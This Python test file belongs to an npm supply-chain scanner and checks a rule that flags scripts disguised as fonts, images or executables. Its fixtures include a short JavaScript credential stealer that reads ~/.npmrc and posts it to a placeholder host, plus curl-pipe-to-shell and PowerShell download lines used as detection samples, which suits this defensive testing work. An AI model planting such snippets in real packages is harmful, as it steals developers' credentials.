"""`static.disguised-file`: files named as a binary format that hold a script or a program.

Fixtures are small and inert: a few bytes of magic numbers, and short script texts that only
name capabilities (`example.invalid` hosts); nothing here is real malware.
"""

import base64
from datetime import UTC, datetime

import pytest

from kitsunox.core.models import (
    ArtifactRef,
    Candidate,
    Change,
    PackageBatch,
    PackageVersionRef,
    PublishInfo,
    Severity,
    VersionSnapshot,
)
from kitsunox.ecosystems.npm.rules.artifact import RULES as NPM_ARTIFACT_RULES
from kitsunox.rules.disguised import (
    MAX_FINDINGS,
    DisguisedFile,
    capabilities,
    detect_format,
    disguise,
    extension,
    script_language,
)
from kitsunox.rules.static import RULES
from kitsunox.stages.static import ContentCache, analyse_batch

# A script that reads a credential file and sends it: names only, nothing runs.
STEALER = (
    b"const fs = require('fs');\n"
    b"const https = require('https');\n"
    b"const os = require('os');\n"
    b"const data = fs.readFileSync(os.homedir() + '/.npmrc', 'utf8');\n"
    b"https.request('https://collect.example.invalid/', { method: 'POST' }).end(data);\n"
)
QUIET_JS = b"const a = 1;\nmodule.exports = function add(b) { return a + b; };\n"
SNAP = VersionSnapshot(
    ref=PackageVersionRef(ecosystem="npm", name="kx", version="1.0.0"),
    publish=PublishInfo(),
    manifest={},
)


def run(files: dict[str, bytes]) -> list[tuple[Severity, str, str]]:
    return [
        (f.severity, f.evidence[0].path or "", f.explanation)
        for f in DisguisedFile().evaluate_artifact(SNAP, files)
    ]


def test_a_font_that_is_a_credential_stealer_is_high() -> None:
    ((severity, path, why),) = run({"dist/fonts/icons.woff2": STEALER, "index.js": QUIET_JS})
    assert severity is Severity.HIGH and path == "dist/fonts/icons.woff2"
    assert "named as a font (`.woff2`)" in why and "JavaScript" in why
    assert "network" in why and "credentials" in why
    assert "No code file of the package names it" in why


@pytest.mark.parametrize(
    ("path", "content"),
    [
        ("a.woff2", b"wOF2\x00\x01\x00\x00" + bytes(40)),
        ("a.woff", b"wOFF\x00\x01\x00\x00" + bytes(40)),
        ("a.ttf", b"\x00\x01\x00\x00\x00\x0c" + bytes(40)),
        ("a.ttf", b"OTTO\x00\x0c" + bytes(40)),  # a CFF font named .ttf
        ("a.png", b"\x89PNG\r\n\x1a\n" + bytes(40)),
        ("a.png", b"RIFF\x10\x00\x00\x00WEBPVP8 " + bytes(40)),  # a WebP named .png
        ("a.jpg", b"\xff\xd8\xff\xe0" + bytes(40)),
        ("a.wasm", b"\x00asm\x01\x00\x00\x00"),
        ("a.node", b"\x7fELF\x02\x01\x01" + bytes(40)),
        ("a.node", b"MZ\x90\x00" + bytes(60)),
        ("a.exe", b"\xcf\xfa\xed\xfe" + bytes(40)),
        ("a.jar", b"PK\x03\x04" + bytes(40)),
        ("a.pdf", b"%PDF-1.7\n" + bytes(40)),
        ("a.mp4", b"\x00\x00\x00\x18ftypmp42" + bytes(40)),
    ],
)
def test_the_claimed_format_or_another_binary_format_is_no_disguise(
    path: str, content: bytes
) -> None:
    assert run({path: content}) == []


@pytest.mark.parametrize(
    "content",
    [
        b"",  # an empty placeholder
        b"  \n",
        b'<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1 1"></svg>',  # SVG named .png
        b"<?xml version='1.0'?><svg/>",
        b"<!DOCTYPE html><html><body>404 Not Found</body></html>",  # a saved error page
        b"version https://git-lfs.github.com/spec/v1\noid sha256:abc\nsize 12\n",  # LFS pointer
        b'{"name": "placeholder"}',  # JSON
        b"placeholder image, replaced at build time\n",  # plain text
        base64.b64encode(b"\x89PNG\r\n\x1a\n" + bytes(30)),  # base64 of the real thing
        b"data:image/png;base64," + base64.b64encode(b"\x89PNG\r\n\x1a\n" + bytes(30)),
    ],
)
def test_text_that_is_not_a_script_is_left_alone(content: bytes) -> None:
    assert run({"img/logo.png": content}) == []


def test_unknown_binary_is_left_alone() -> None:
    assert run({"a.png": bytes(range(256)) * 4}) == []
    assert run({"a.png": b"\x01\x02\x03abc" * 20}) == []  # control bytes, no NUL
    assert run({"a.png": b"\xff\xfe\xfd" * 200}) == []  # not UTF-8


def test_a_pdf_with_a_preamble_is_a_pdf() -> None:
    assert detect_format(b"junk\r\n%PDF-1.4\n") == "pdf"


def test_odd_base64_and_broken_json_are_read_as_text() -> None:
    assert run({"a.png": b"A" * 17}) == []  # not decodable: plain text, no script
    braces = b"{ const a = require('fs'); module.exports = a; }"
    ((severity, _, _),) = run({"a.png": braces})
    assert severity is Severity.LOW


def test_large_base64_is_not_decoded(monkeypatch: pytest.MonkeyPatch) -> None:
    monkeypatch.setattr("kitsunox.rules.disguised.MAX_DECODE_BYTES", 8)
    assert run({"assets/a.ttf": base64.b64encode(STEALER)}) == []


def test_base64_of_a_script_is_decoded_and_classified() -> None:
    ((severity, _, why),) = run({"assets/a.ttf": base64.b64encode(STEALER)})
    assert severity is Severity.HIGH and "JavaScript code (base64-encoded)" in why


def test_an_executable_under_a_media_name_is_high() -> None:
    ((severity, _, why),) = run({"assets/logo.png": b"\x7fELF\x02\x01\x01" + bytes(40)})
    assert severity is Severity.HIGH and "ELF executable" in why


def test_an_archive_under_a_font_name_is_low() -> None:
    ((severity, _, why),) = run({"fonts/a.woff": b"PK\x03\x04" + bytes(40)})
    assert severity is Severity.LOW and "zip archive" in why


def test_an_archive_under_an_archive_name_is_none() -> None:
    assert run({"a.tgz": b"\x1f\x8b\x08\x00" + bytes(20), "b.zip": b"PK\x05\x06" + bytes(20)}) == []


def test_a_quiet_script_is_low_unless_code_names_it() -> None:
    ((severity, _, _),) = run({"img/a.gif": QUIET_JS})
    assert severity is Severity.LOW
    ((severity, _, why),) = run(
        {"img/a.gif": QUIET_JS, "lib/load.js": b"require('fs').readFileSync(__dirname + '/a.gif')"}
    )
    assert severity is Severity.MEDIUM and "`lib/load.js` names it" in why


LAUNCHER = (
    b'#!/bin/sh\necho "Error: kx native binary not installed." >&2\n'
    b'echo "Run: curl -fsSL https://kx.example.invalid/install.sh | bash" >&2\nexit 1\n'
)
NODE_LAUNCHER = (
    b"#!/usr/bin/env node\nconst { spawnSync } = require('node:child_process');\n"
    b"spawnSync(require.resolve('kx-linux/bin/kx'), process.argv.slice(2));\n"
)


@pytest.mark.parametrize("script", [LAUNCHER, NODE_LAUNCHER, QUIET_JS])
def test_a_launcher_in_place_of_a_program_is_info(script: bytes) -> None:
    files = {"bin/kx.exe": script, "install.js": b"fs.copyFileSync(src, 'bin/kx.exe')"}
    ((severity, _, why),) = run(files)
    assert severity is Severity.INFO
    assert "launcher or placeholder shape" in why


def test_a_program_name_that_hides_a_stealer_is_high() -> None:
    ((severity, _, _),) = run({"bin/kx.exe": STEALER})
    assert severity is Severity.HIGH
    ((severity, _, _),) = run({"lib/kx.so": b"const f = 'x';\nmodule.exports = eval(f);\n"})
    assert severity is Severity.HIGH


def test_a_script_named_as_a_native_module_is_not_a_launcher() -> None:
    # `.node` files are loaded with dlopen, never run as scripts.
    ((severity, _, _),) = run({"build/kx.node": NODE_LAUNCHER})
    assert severity is Severity.HIGH


def test_a_stylesheet_naming_a_font_is_no_loader() -> None:
    ((severity, _, _),) = run({"f/a.woff": QUIET_JS, "f/a.css": b"src: url(a.woff)"})
    assert severity is Severity.LOW


def test_weak_magic_does_not_hide_text() -> None:
    # `BM` and `MZ` are bitmap and PE magic, but text that starts with them is still read.
    script = b"BM = require('child_process');\nconst x = BM.execSync('id');\n"
    assert detect_format(script) is None
    ((severity, _, _),) = run({"a.bmp": script})
    assert severity is Severity.HIGH
    assert detect_format(b"BM" + bytes(60)) == "bmp"


@pytest.mark.parametrize(
    ("text", "language"),
    [
        ("#!/usr/bin/env node\nconsole.log(1)", "JavaScript"),
        ("#!/bin/sh\necho hi", "shell"),
        ("#!/usr/bin/env python3\nprint(1)", "Python"),
        ("curl -s https://x.invalid/a | sh\nchmod +x a", "shell"),
        ("$u = $env:TEMP\nInvoke-WebRequest -Uri x -OutFile $u", "PowerShell"),
        ("import os\nfrom sys import argv\n", "Python"),
        ("@echo off\nset A=1\n", "batch"),
        (QUIET_JS.decode(), "JavaScript"),
        ("Lorem ipsum dolor sit amet.", None),
        ("function words in prose", None),
    ],
)
def test_script_language(text: str, language: str | None) -> None:
    assert script_language(text) == language


def test_capabilities_name_what_a_script_uses() -> None:
    names = [name for name, _ in capabilities(STEALER.decode())]
    assert names == ["network", "credentials"]
    assert [n for n, _ in capabilities("require('child_process').exec('x'); eval(y)")] == [
        "process execution",
        "dynamic code",
    ]


def test_extension() -> None:
    assert extension("a/b/c.WOFF2") == "woff2"
    assert extension("a/.png") is None  # a dotfile, no extension
    assert extension("a/README") is None


def test_disguise_reports_the_kind() -> None:
    found = disguise("woff2", STEALER)
    assert found is not None and found.kind == "script" and found.capabilities
    assert disguise("woff2", b"wOF2" + bytes(20)) is None


def test_findings_are_capped_most_severe_first() -> None:
    files = {f"img/{i}.png": QUIET_JS for i in range(MAX_FINDINGS + 2)}
    files["img/z.png"] = STEALER
    found = run(files)
    assert len(found) == MAX_FINDINGS
    assert found[0][0] is Severity.HIGH and found[0][1] == "img/z.png"


def _snapshot(version: str) -> VersionSnapshot:
    return VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="kx", version=version),
        publish=PublishInfo(published_at=datetime(2026, 11, 10, tzinfo=UTC)),
        manifest={},
        artifact=ArtifactRef(url=f"https://r.test/kx-{version}.tgz", unpacked_size=100),
    )


def test_a_follow_on_that_still_ships_the_file_is_flagged() -> None:
    # The file rules see only what an update adds; this rule reads every version's files, so
    # a release that ships the same disguised font as its base is flagged too.
    tree = {"index.js": QUIET_JS, "fonts/a.woff2": STEALER}
    trees = {"1.0.0": tree, "1.0.1": tree | {"index.js": QUIET_JS + b"\n"}}
    batch = PackageBatch(
        ecosystem="npm",
        name="kx",
        base=_snapshot("1.0.0"),
        versions=(Candidate(change=Change(new=_snapshot("1.0.1"), previous=_snapshot("1.0.0"))),),
    )
    result = analyse_batch(
        batch,
        lambda s: trees[s.ref.version],
        ContentCache(None, RULES),
        artifact_rules=NPM_ARTIFACT_RULES,
    )
    (version,) = result.versions
    assert version.history[-1].forwarded
    assert "static.disguised-file" in version.history[-1].reason
